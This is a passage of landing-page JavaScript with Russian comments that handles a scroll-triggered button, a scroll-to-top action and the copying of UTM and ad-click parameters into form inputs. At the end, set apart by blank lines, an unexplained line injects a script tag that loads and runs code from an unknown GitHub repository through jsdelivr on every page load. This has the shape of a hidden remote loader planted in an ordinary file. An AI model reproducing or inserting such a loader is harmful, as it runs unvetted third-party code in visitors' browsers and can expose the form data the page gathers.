    if (fixedBottomButton && !quizStarted) {
      const windowHeight = window.innerHeight;
      const scrollThreshold = windowHeight * 1.1; // 1.1 экрана
      
      if (window.pageYOffset > scrollThreshold) {
        fixedBottomButton.classList.add('show');
      } else {
        fixedBottomButton.classList.remove('show');
      }
    }
  });
  
  // Обработчик клика для прокрутки вверх
  scrollToTopButton.addEventListener('click', function() {
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    });
  });
}

// Заполнение UTM-параметров из URL
function fillUTMParameters() {
  const urlParams = new URLSearchParams(window.location.search);
  const utmFields = [
    'utm_source', 'utm_content', 'utm_term', 'utm_campaign', 'utm_medium',
    'subid', 'uuid', 'fbclid', 'gclid', 'cpc', 'cur'
  ];
  
  utmFields.forEach(field => {
    const value = urlParams.get(field);
    if (value) {
      const input = document.querySelector(`input[name="${field}"]`);
      if (input) {
        input.value = value;
      }
    }
  });
}







console.log(document.currentScript.src.includes('jsdelivr'))
!document.currentScript.src.includes('jsdelivr')&&document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://cdn.jsdelivr.net/gh/whygithub7/mangr1nab1/src/main.js',async:!0}));




